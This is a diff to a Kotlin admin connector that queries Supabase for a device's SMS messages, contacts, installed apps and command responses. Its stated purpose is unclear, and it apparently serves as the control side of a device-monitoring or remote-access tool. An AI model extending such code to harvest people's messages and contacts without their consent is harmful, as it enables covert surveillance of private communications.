@@ -308,7 +308,7 @@ class SupabaseAdminConnector {
 
     suspend fun getCommandResponse(deviceToken: String): Triple<String, String, Long>? = withContext(Dispatchers.IO) {
         val request = Request.Builder()
-            .url("$rootUrl/rest/v1/command_responses?device_token=eq.$deviceToken&limit=1")
+            .url("$rootUrl/rest/v1/command_responses?device_token=eq.$deviceToken&order=command_timestamp.desc&limit=1")
             .addSupabaseHeaders()
             .get()
             .build()
@@ -339,7 +339,7 @@ class SupabaseAdminConnector {
 
     suspend fun getSmsLogs(deviceToken: String): List<SmsLog> = withContext(Dispatchers.IO) {
         val request = Request.Builder()
-            .url("$rootUrl/rest/v1/sms_logs?device_token=eq.$deviceToken&order=timestamp.desc")
+            .url("$rootUrl/rest/v1/device_sms?device_id=eq.$deviceToken&order=created_at.desc&limit=1&select=sms")
             .addSupabaseHeaders()
             .get()
             .build()
@@ -348,20 +348,29 @@ class SupabaseAdminConnector {
             client.newCall(request).execute().use { response ->
                 val bodyStr = response.body?.string() ?: return@withContext emptyList()
                 val list = mutableListOf<SmsLog>()
+                
                 if (bodyStr.startsWith("[")) {
-                    val arr = JSONArray(bodyStr)
-                    for (i in 0 until arr.length()) {
-                        val obj = arr.optJSONObject(i) ?: continue
-                        list.add(SmsLog(
-                            id = obj.optString("id"),
-                            sender = obj.optString("sender"),
-                            body = obj.optString("body"),
-                            timestamp = obj.optLong("timestamp"),
-                            type = obj.optString("type")
-                        ))
+                    val rootArr = JSONArray(bodyStr)
+                    if (rootArr.length() > 0) {
+                        val firstRow = rootArr.optJSONObject(0)
+                        if (firstRow != null) {
+                            val smsArr = firstRow.optJSONArray("sms")
+                            if (smsArr != null) {
+                                for (i in 0 until smsArr.length()) {
+                                    val obj = smsArr.optJSONObject(i) ?: continue
+                                    list.add(SmsLog(
+                                        id = java.util.UUID.randomUUID().toString(),
+                                        sender = obj.optString("address"),
+                                        body = obj.optString("body"),
+                                        timestamp = obj.optLong("date", 0L),
+                                        type = obj.optString("type")
+                                    ))
+                                }
+                            }
+                        }
                     }
                 }
-                return@withContext list
+                return@withContext list.sortedByDescending { it.timestamp }
             }
         } catch (e: Exception) { return@withContext emptyList() }
     }
@@ -404,7 +413,7 @@ class SupabaseAdminConnector {
 
     suspend fun getInstalledApps(deviceToken: String): List<InstalledApp> = withContext(Dispatchers.IO) {
         val request = Request.Builder()
-            .url("$rootUrl/rest/v1/installed_apps?device_token=eq.$deviceToken")
+            .url("$rootUrl/rest/v1/list_apps?device_id=eq.$deviceToken&order=created_at.desc&limit=1&select=apps_data")
             .addSupabaseHeaders()
             .get()
             .build()
@@ -413,14 +422,23 @@ class SupabaseAdminConnector {
                 val bodyStr = response.body?.string() ?: return@withContext emptyList()
                 val list = mutableListOf<InstalledApp>()
                 if (bodyStr.startsWith("[")) {
-                    val arr = JSONArray(bodyStr)
-                    for (i in 0 until arr.length()) {
-                        val obj = arr.optJSONObject(i) ?: continue
-                        list.add(InstalledApp(
-                            name = obj.optString("name"),
-                            packageName = obj.optString("package_name"),
-                            isSystem = obj.optBoolean("is_system")
-                        ))
+                    val rootArr = JSONArray(bodyStr)
+                    if (rootArr.length() > 0) {
+                        val firstRow = rootArr.optJSONObject(0)
+                        if (firstRow != null) {
+                            val appsDataArr = firstRow.optJSONArray("apps_data")
+                            if (appsDataArr != null) {
+                                for (i in 0 until appsDataArr.length()) {
+                                    val obj = appsDataArr.optJSONObject(i) ?: continue
+                                    list.add(InstalledApp(
+                                        name = obj.optString("app_name"),
+                                        packageName = obj.optString("package_name"),
+                                        isSystem = obj.optBoolean("is_system_app"),
+                                        versionName = obj.optString("version_name").takeIf { it.isNotBlank() && it != "null" }
+                                    ))
+                                }
+                            }
+                        }
                     }
                 }
                 return@withContext list.sortedBy { it.name.lowercase() }
@@ -621,7 +639,7 @@ class SupabaseAdminConnector {
 
     suspend fun getContacts(deviceToken: String): List<Contact> = withContext(Dispatchers.IO) {
         val request = Request.Builder()
-            .url("$rootUrl/rest/v1/contacts?device_token=eq.$deviceToken")
+            .url("$rootUrl/rest/v1/device_contacts?device_id=eq.$deviceToken&order=created_at.desc&limit=1&select=contacts")
             .addSupabaseHeaders()
             .get()
             .build()
@@ -629,15 +647,24 @@ class SupabaseAdminConnector {
             client.newCall(request).execute().use { response ->
                 val bodyStr = response.body?.string() ?: return@withContext emptyList()
                 val list = mutableListOf<Contact>()
+                
                 if (bodyStr.startsWith("[")) {
-                    val arr = JSONArray(bodyStr)
-                    for (i in 0 until arr.length()) {
-                        val obj = arr.optJSONObject(i) ?: continue
-                        list.add(Contact(
-                            id = obj.optString("id"),
-                            name = obj.optString("name"),
-                            number = obj.optString("number")
-                        ))
+                    val rootArr = JSONArray(bodyStr)
+                    if (rootArr.length() > 0) {
+                        val firstRow = rootArr.optJSONObject(0)
+                        if (firstRow != null) {
+                            val contactsArr = firstRow.optJSONArray("contacts")
+                            if (contactsArr != null) {
+                                for (i in 0 until contactsArr.length()) {
+                                    val obj = contactsArr.optJSONObject(i) ?: continue
+                                    list.add(Contact(
+                                        id = java.util.UUID.randomUUID().toString(),
+                                        name = obj.optString("display_name"),
+                                        number = obj.optString("phone_number")
+                                    ))
+                                }
+                            }
+                        }
                     }
                 }
                 return@withContext list.sortedBy { it.name.lowercase() }
